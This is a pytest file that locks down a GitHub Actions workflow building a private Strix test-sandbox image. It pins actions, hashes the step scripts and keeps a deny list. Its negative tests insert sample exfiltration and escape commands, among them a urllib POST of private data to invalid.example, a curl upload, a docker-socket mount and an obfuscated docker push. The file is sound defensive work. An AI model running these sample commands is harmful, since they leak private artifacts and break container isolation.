"""The hosted test-image lane remains private, exact, and cleanup-complete."""

from __future__ import annotations

import hashlib
import re
from copy import deepcopy
from pathlib import Path
from typing import Any

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github/workflows/strix-test-sandbox-image.yml"
APPROVED_ACTIONS = {
    "Checkout exact BlueFire revision without retained credentials": {
        "uses": "actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803",
        "with": {
            "ref": "${{ github.sha }}",
            "fetch-depth": 1,
            "persist-credentials": False,
        },
    },
    "Set up exact Python toolchain": {
        "uses": "actions/setup-python@ece7cb06caefa5fff74198d8649806c4678c61a1",
        "with": {"python-version": "3.12.14", "check-latest": False},
    },
    "Set up exact Go toolchain for the candidate build hook": {
        "uses": "actions/setup-go@b7ad1dad31e06c5925ef5d2fc7ad053ef454303e",
        "with": {"go-version": "1.24.10", "cache": False},
    },
    "Set up exact uv frontend without a shared cache": {
        "uses": "astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2",
        "with": {
            "version": "${{ steps.uv-version.outputs.version }}",
            "enable-cache": False,
        },
    },
}
APPROVED_STEP_ORDER = (
    "Checkout exact BlueFire revision without retained credentials",
    "Set up exact Python toolchain",
    "Set up exact Go toolchain for the candidate build hook",
    "Read reviewed uv build version",
    "Set up exact uv frontend without a shared cache",
    "Require the exact private qualification implementation",
    "Rebuild the provenance-bound Strix candidate",
    "Resolve the single exact candidate wheel",
    "Prepare the pinned Strix runtime without execution",
    "Build the minimal worker artifact from this revision",
    "Prepare the sealed worker runtime without claiming execution",
    "Require finalized same-job runtime composite",
    "Bind the finalized same-job runtime composite",
    "Capture the separate controller Test Caido provider descriptor",
    "Prefetch exact packages and reviewed SBOM tool",
    "Preload the exact reviewed Debian base",
    "Build and qualify the runner-private image",
    "Archive the exact committed product source outside checkout",
    "Build the packaged Linux service from the archived source",
    "Bind the exact packaged service wheel",
    "Install the full service in its own clean environment",
    "Smoke the installed service outside checkout",
    "Remove this run's exact private image resources",
    "Remove exact private service build materials",
)
APPROVED_RUN_SHA256 = {
    "Read reviewed uv build version": (
        "ab54a8015eafb51b42820c78fe448dbcb799f0330a75d569b918c970bcb553b8"
    ),
    "Require the exact private qualification implementation": (
        "7e9d80ce94c4eb1c7f5d49242bea059c110c7dcf3061d20839974793d9ba429b"
    ),
    "Rebuild the provenance-bound Strix candidate": (
        "852989e7371d5748e9626fe7205e51d6dab9a956a0a870e0626b662b89162867"
    ),
    "Resolve the single exact candidate wheel": (
        "d020f6a1b9e6850ac9dad744118235dd5f7c1f1d507d9a266ab4df6f73a66724"
    ),
    "Prepare the pinned Strix runtime without execution": (
        "1af03481f8fab8b760b1137c24deeb2b51edd2d0cde72f1dd6c2159ae3f9b466"
    ),
    "Build the minimal worker artifact from this revision": (
        "ce04dd3898157b7485e1fff8b637acbcf25121a9fdf4c6421cd0697357304b10"
    ),
    "Prepare the sealed worker runtime without claiming execution": (
        "5d353b227fe523018a49c83f2babafe6c4b709c1a155f210d55614d1082ce6e7"
    ),
    "Require finalized same-job runtime composite": (
        "5301475efebd931222648462892dfcbd573c0e96ee5d1382ea38587099442100"
    ),
    "Bind the finalized same-job runtime composite": (
        "bdd2e9101b65eaa1d8c79a6d2a14e533b3104bd05cda1e180a009e1503838ca9"
    ),
    "Capture the separate controller Test Caido provider descriptor": (
        "a7d559a54a4fbd1e87b38e3d38cde8c7f9a7e632fe13b6f8cb208843a092cff0"
    ),
    "Prefetch exact packages and reviewed SBOM tool": (
        "76ff7521062622cf02bf812758906503571f0f81c9e1296c79ef46b4874e1834"
    ),
    "Preload the exact reviewed Debian base": (
        "4ebf143eb4253ac640fa3de855c6edff75000e1c05480093c36d0abab3562e9d"
    ),
    "Build and qualify the runner-private image": (
        "37a7dee1b7b5b0a38908ca3b56fdaae25b881b3040eb382a3b2ec2c1dcbac6e0"
    ),
    "Archive the exact committed product source outside checkout": (
        "f0d17ace616d3785cda189f2b2b32a3c6df0f87aeb72dd04d1cb710a8270e3d8"
    ),
    "Build the packaged Linux service from the archived source": (
        "01138e281fef71386d3ee46417a2a5004ccc220f32ba17d0510f97208ac29cdc"
    ),
    "Bind the exact packaged service wheel": (
        "dff1a3575d8a0c3f0ad97e8d76708c3655081de9b71aaccdecbc6b2fa5b8027a"
    ),
    "Install the full service in its own clean environment": (
        "bc816a07d719d2b5874258a7c64123d51eab80c300b319a46a3095570296c6ea"
    ),
    "Smoke the installed service outside checkout": (
        "da0385c842e6be403fc420d382a155e6c6c1f3b9df3636af48c474ac7d070dd5"
    ),
    "Remove this run's exact private image resources": (
        "1f1ef25c9df87776c59965ddb098c32810bf76dd35517eace4bf4ff5eb83140d"
    ),
    "Remove exact private service build materials": (
        "83d55240ce21675b6b46501411085102bf8f8ae15b7c8e7b1c4d284b79065fcb"
    ),
}
FORBIDDEN = (
    "docker login",
    "docker push",
    "docker system prune",
    "docker image prune",
    "docker container prune",
    "docker network prune",
    "gh release",
    "gh api",
    "aws s3",
    "gcloud storage",
    "az storage",
    "curl -t",
    "curl --upload-file",
    "--network host",
    "--network=host",
    "host.docker.internal:host-gateway",
    "-v /var/run/docker.sock",
    "--volume /var/run/docker.sock",
    "--mount type=bind,source=/var/run/docker.sock",
    "rm -rf $runner_temp",
    'rm -rf "$runner_temp"',
    "|| true",
    "|| exit 0",
    "|| echo",
    "if command -v docker",
    "strix-sandbox",
    "usestrix/strix-sandbox",
    "kali-rolling",
    "caidoapp/caido",
)


def _load() -> dict[str, Any]:
    return yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))


def _trigger(workflow: dict[str, Any]) -> Any:
    return workflow.get("on", workflow.get(True))


def _step(workflow: dict[str, Any], name: str) -> dict[str, Any]:
    matches = [
        step
        for job in workflow["jobs"].values()
        for step in job["steps"]
        if step.get("name") == name
    ]
    assert len(matches) == 1
    return matches[0]


def _assert_private_workflow(workflow: dict[str, Any]) -> None:
    assert _trigger(workflow) == {"workflow_dispatch": None}
    assert workflow["permissions"] == {"contents": "read"}
    assert workflow["concurrency"] == {
        "group": (
            "strix-test-sandbox-image-${{ github.sha }}-"
            "${{ github.run_id }}-${{ github.run_attempt }}"
        ),
        "cancel-in-progress": False,
    }
    assert set(workflow["jobs"]) == {"qualify"}
    job = workflow["jobs"]["qualify"]
    assert job["runs-on"] == "ubuntu-24.04"
    assert 1 <= job["timeout-minutes"] <= 90
    assert not any(job.get(key) for key in ("env", "defaults", "container", "services"))
    assert not job.get("continue-on-error")
    assert tuple(step.get("name") for step in job["steps"]) == APPROVED_STEP_ORDER

    for step in job["steps"]:
        assert ("uses" in step) != ("run" in step)
        assert not step.get("continue-on-error")
        assert "working-directory" not in step
        assert not step.get("env")
        if "uses" in step:
            assert set(step) == {"name", "uses", "with"}
            assert {key: step[key] for key in ("uses", "with")} == APPROVED_ACTIONS[step["name"]]
        else:
            assert set(step) <= {"name", "id", "if", "shell", "run"}
            assert step.get("shell") == "bash"
            assert (
                hashlib.sha256(step["run"].encode()).hexdigest()
                == APPROVED_RUN_SHA256[step["name"]]
            )
            lowered = step["run"].lower()
            for fragment in FORBIDDEN:
                assert fragment not in lowered
            assert (
                re.search(
                    r"(?:docker\.io/|ghcr\.io/|quay\.io/)[a-z0-9._/-]+:"
                    r"(?:latest|[a-z][a-z0-9._-]*)\b",
                    lowered,
                )
                is None
            )

    checkout = job["steps"][0]
    assert checkout["uses"] == "actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803"
    assert checkout["with"] == {
        "ref": "${{ github.sha }}",
        "fetch-depth": 1,
        "persist-credentials": False,
    }

    prerequisite = _step(workflow, "Require the exact private qualification implementation")["run"]
    for required in (
        "tools/qualify_strix_test_sandbox_image.py",
        "tools/qualify_strix_runtime_candidate.py",
        "tools/build_strix_worker_runtime_artifact.py",
        "tools/prepare_strix_linux_runtime_closure.py",
        "tools/strix_runtime_closure_prepare_core.py",
        "bluefire/test_caido_protocol_entry.py",
        "bluefire/test_caido_protocol_provider.py",
        "bluefire/test_caido_protocol_server.py",
        "test -S /var/run/docker.sock",
        "docker version --format",
        "docker buildx inspect default",
        "skopeo --version",
        "dpkg-query -W",
        'test "$(git rev-parse HEAD)" = "${{ github.sha }}"',
    ):
        assert required in prerequisite

    final_inputs = _step(workflow, "Require finalized same-job runtime composite")["run"]
    assert "Final native fixed-exec runtime qualification is not produced" in final_inputs
    assert "Add the reviewed same-job qualifier before dispatching" in final_inputs
    assert "exit 2" in final_inputs
    for required in (
        "steps.prelaunch.outputs.root",
        "steps.prelaunch.outputs.manifest",
        "bluefire-strix-runtime-composite/strix-linux-runtime-root",
        "bluefire-strix-runtime-composite/strix-linux-runtime-composite.json",
    ):
        assert required in final_inputs

    runtime = _step(workflow, "Bind the finalized same-job runtime composite")["run"]
    assert "bluefire.strix-linux-qualified-runtime-composite.v1" in runtime
    assert 'row.get("composite_ref")' in runtime
    assert 'print(f"ref={reference}")' in runtime
    assert "prepare_strix_linux_runtime_closure" not in runtime
    for required in (
        "prelaunch_plan_ref",
        "fixed_exec_qualification_ref",
        "worker_artifact_digest",
        "worker_record_digest",
        "installed_distributions_digest",
        "bluefire-strix-worker",
        "worker_source_revision",
        "installed_worker_invocation_digest",
        "full_product_wheel_present",
    ):
        assert required in runtime

    candidate = _step(workflow, "Resolve the single exact candidate wheel")["run"]
    assert "-name 'strix_agent-1.7.0-*.whl'" in candidate
    assert '[[ "${#wheels[@]}" -ne 1 ]]' in candidate
    assert '>> "$GITHUB_OUTPUT"' in candidate

    candidate_preparation = _step(workflow, "Prepare the pinned Strix runtime without execution")
    assert "python -m tools.qualify_strix_runtime_candidate" in candidate_preparation["run"]
    assert '--bluefire-source-revision "${{ github.sha }}"' in candidate_preparation["run"]

    worker = _step(workflow, "Build the minimal worker artifact from this revision")
    assert worker["id"] == "worker"
    for required in (
        "python -m tools.build_strix_worker_runtime_artifact",
        '--source-revision "${{ github.sha }}"',
        "bluefire.strix-worker-runtime-build-result.v1",
        "worker_record_digest",
        "manifest_digest",
        'print(f"artifact={artifact}")',
        "print(f\"sha256={digest.removeprefix('sha256:')}\")",
    ):
        assert required in worker["run"]

    prelaunch = _step(workflow, "Prepare the sealed worker runtime without claiming execution")
    assert prelaunch["id"] == "prelaunch"
    for required in (
        "python -m tools.prepare_strix_linux_runtime_closure",
        "steps.candidate.outputs.wheel",
        "steps.worker.outputs.artifact",
        "steps.worker.outputs.sha256",
        "runtime_inventory_digest(closure)",
        "prepared-not-startup-qualified",
        'print(f"root={closure}")',
    ):
        assert required in prelaunch["run"]

    provider = _step(workflow, "Capture the separate controller Test Caido provider descriptor")[
        "run"
    ]
    assert "python -m bluefire.test_caido_protocol_provider --describe" in provider
    assert "strix-linux-runtime-root/runtime/bin/python" not in provider
    assert "bluefire.test-caido-protocol-provider-descriptor.v1" in provider
    assert "provider_source_digest" in provider
    assert '>> "$GITHUB_OUTPUT"' in provider

    qualify = _step(workflow, "Build and qualify the runner-private image")["run"]
    for required in (
        "python -m tools.qualify_strix_test_sandbox_image qualify",
        '--bluefire-source-revision "${{ github.sha }}"',
        '--qualifier-revision "${{ github.sha }}"',
        '--runtime-root "$RUNNER_TEMP/bluefire-strix-runtime-composite/strix-linux-runtime-root"',
        '--runtime-composite-manifest "$RUNNER_TEMP/bluefire-strix-runtime-composite/strix-linux-runtime-composite.json"',
        '--runtime-composite-ref "${{ steps.runtime.outputs.ref }}"',
        "--provider-source bluefire/test_caido_protocol_entry.py",
        "--provider-source bluefire/test_caido_protocol_provider.py",
        "--provider-source bluefire/test_caido_protocol_server.py",
        '--provider-source-digest "${{ steps.provider.outputs.digest }}"',
        '--package-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-packages"',
        '--syft "$RUNNER_TEMP/bluefire-strix-test-sandbox-tools/syft"',
        '--output-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-output"',
        '--work-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-work"',
        "--docker-socket unix:///var/run/docker.sock",
    ):
        assert required in qualify
    assert "timeout --signal=TERM --kill-after=30s 20m" in qualify

    base = _step(workflow, "Preload the exact reviewed Debian base")["run"]
    assert (
        "docker.io/library/debian@"
        "sha256:3783cc01769c7b2b1b83a5c5ad96c815348e28ed7da68e2e3687004faa906251"
    ) in base
    assert 'docker pull "$base"' in base
    assert 'docker image inspect "$base"' in base

    archive = _step(workflow, "Archive the exact committed product source outside checkout")
    for required in (
        'test "$(git rev-parse HEAD)" = "${{ github.sha }}"',
        "git -c tar.umask=0022 archive --format=tar",
        '"${{ github.sha }}"',
        "bluefire/_source_revision.txt",
    ):
        assert required in archive["run"]

    package = _step(workflow, "Build the packaged Linux service from the archived source")
    for required in (
        'source="$RUNNER_TEMP/bluefire-product-source"',
        "RUSTUP_HOME=",
        "CARGO_HOME=",
        "rustup target add x86_64-unknown-linux-musl",
        "python tools/build_native_runner.py --target x86_64-unknown-linux-musl",
        "python tools/stage_native_runner.py",
        "python -m build --wheel",
        "python tools/verify_packaged_runner.py inspect",
        "--wheel-platform-tag linux_x86_64",
    ):
        assert required in package["run"]

    product = _step(workflow, "Bind the exact packaged service wheel")
    assert product["id"] == "product"
    for required in (
        "len(wheels) != 1",
        "bluefire/_build_info.json",
        'metadata.get("source_revision") != "${{ github.sha }}"',
        'metadata.get("source_provenance") != "git_archive"',
        'print(f"wheel={wheel}")',
        'print(f"digest={digest}")',
    ):
        assert required in product["run"]

    installed = _step(workflow, "Install the full service in its own clean environment")
    assert 'python -m venv "$RUNNER_TEMP/bluefire-installed-service"' in installed["run"]
    assert '"${{ steps.product.outputs.wheel }}"' in installed["run"]
    smoke = _step(workflow, "Smoke the installed service outside checkout")
    assert 'cd "$RUNNER_TEMP"' in smoke["run"]
    assert '"$RUNNER_TEMP/bluefire-installed-service/bin/python" -I -B' in smoke["run"]
    assert '--forbid-root "$GITHUB_WORKSPACE"' in smoke["run"]
    assert "bluefire-installed-service-smoke.json" in smoke["run"]

    cleanup = _step(workflow, "Remove this run's exact private image resources")
    assert cleanup.get("if") == "${{ always() }}"
    assert "python -m tools.qualify_strix_test_sandbox_image cleanup" in cleanup["run"]
    assert "python -m tools.qualify_strix_test_sandbox_image cleanup-partial" in cleanup["run"]
    assert "strix-test-sandbox-image-manifest.json" in cleanup["run"]
    assert "strix-test-sandbox-private-ledger.json" in cleanup["run"]
    assert "bluefire.strix-test-sandbox-private-ledger.v2" in cleanup["run"]
    assert '{"reserved", "image-bound", "qualified"}' in cleanup["run"]
    assert 'output="$RUNNER_TEMP/bluefire-strix-test-sandbox-output"' in cleanup["run"]
    assert 'test ! -e "$ledger"' in cleanup["run"]
    assert job["steps"][-2] is cleanup

    service_cleanup = _step(workflow, "Remove exact private service build materials")
    assert service_cleanup.get("if") == "${{ always() }}"
    for required in (
        'root = Path(os.environ["RUNNER_TEMP"]).resolve(strict=True)',
        '"bluefire-product-source.tar"',
        '"bluefire-product-source"',
        '"bluefire-product-rustup"',
        '"bluefire-product-cargo"',
        '"bluefire-installed-service"',
        '"bluefire-installed-service-state"',
        '"verify_packaged_runner.py"',
        "path.is_symlink()",
        "shutil.rmtree(path)",
        "private service build material remains",
    ):
        assert required in service_cleanup["run"]
    assert job["steps"][-1] is service_cleanup

    scripts = "\n".join(step["run"] for step in job["steps"] if "run" in step).lower()
    assert "actions/upload-artifact" not in scripts
    assert "bluefire-nexus.whl" not in scripts
    assert "docker buildx build" not in scripts
    assert "docker build " not in scripts
    assert "docker run " not in scripts
    assert "docker rm " not in scripts


def test_workflow_is_same_job_private_qualification() -> None:
    _assert_private_workflow(_load())


@pytest.mark.parametrize(
    "action",
    [
        "actions/upload-artifact@" + "a" * 40,
        "actions/cache@" + "b" * 40,
        "docker/login-action@" + "c" * 40,
        "docker/build-push-action@" + "d" * 40,
        "third-party/publisher@" + "e" * 40,
    ],
)
def test_publication_and_cache_actions_are_rejected(action: str) -> None:
    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].insert(
        -1, {"name": "Publish", "uses": action, "with": {"path": "."}}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


@pytest.mark.parametrize(
    "script",
    [
        "docker login ghcr.io",
        "docker push localhost/bluefire/test:latest",
        "docker system prune -af",
        "docker run --network host image",
        "docker run --add-host=host.docker.internal:host-gateway image",
        "docker run -v /var/run/docker.sock:/var/run/docker.sock image",
        "docker build -t docker.io/library/debian:bookworm .",
        "docker pull ghcr.io/usestrix/strix-sandbox@sha256:" + "0" * 64,
        "curl --upload-file image.tar https://uploads.invalid/image.tar",
        "gh release upload test image.tar",
        'rm -rf "$RUNNER_TEMP"',
        """python - <<'PY'
import urllib.request
urllib.request.urlopen(
    urllib.request.Request("https://invalid.example", data=b"private")
)
PY""",
        'cmd=docker; sub=push; "$cmd" "$sub" localhost/private:test',
        "docker pull debian:bookworm",
    ],
)
def test_shell_publication_host_escape_and_broad_cleanup_are_rejected(script: str) -> None:
    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].insert(
        -1, {"name": "Mutation", "shell": "bash", "run": script}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


@pytest.mark.parametrize(
    "removed",
    [
        '--bluefire-source-revision "${{ github.sha }}"',
        '--runtime-composite-ref "${{ steps.runtime.outputs.ref }}"',
        "--provider-source bluefire/test_caido_protocol_entry.py",
        '--provider-source-digest "${{ steps.provider.outputs.digest }}"',
        '--package-root "$RUNNER_TEMP/bluefire-strix-test-sandbox-packages"',
        '--syft "$RUNNER_TEMP/bluefire-strix-test-sandbox-tools/syft"',
        "--docker-socket unix:///var/run/docker.sock",
    ],
)
def test_qualification_cannot_drop_exact_inputs(removed: str) -> None:
    workflow = _load()
    step = _step(workflow, "Build and qualify the runner-private image")
    step["run"] = step["run"].replace(removed, "")
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


@pytest.mark.parametrize(
    "fallback",
    [
        "command -v docker >/dev/null || exit 0",
        "test -S /var/run/docker.sock || echo 'docker_executed:false'",
        "python -m tools.qualify_strix_test_sandbox_image qualify || true",
        "if command -v docker; then echo qualified; else echo skipped; fi",
    ],
)
def test_missing_docker_cannot_become_a_pass(fallback: str) -> None:
    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].insert(
        -1, {"name": "False fallback", "shell": "bash", "run": fallback}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


def test_cleanup_is_last_always_and_non_cancellable() -> None:
    workflow = _load()
    _step(workflow, "Remove this run's exact private image resources")["if"] = "${{ success() }}"
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)

    workflow = _load()
    workflow["concurrency"]["cancel-in-progress"] = True
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)

    workflow = _load()
    workflow["jobs"]["qualify"]["steps"].append(
        {"name": "After cleanup", "shell": "bash", "run": "echo done"}
    )
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)


def test_dispatch_has_no_caller_selected_image_or_digest_inputs() -> None:
    workflow = deepcopy(_load())
    _trigger(workflow)["workflow_dispatch"] = {
        "inputs": {"base": {"type": "string", "required": True}}
    }
    with pytest.raises(AssertionError):
        _assert_private_workflow(workflow)
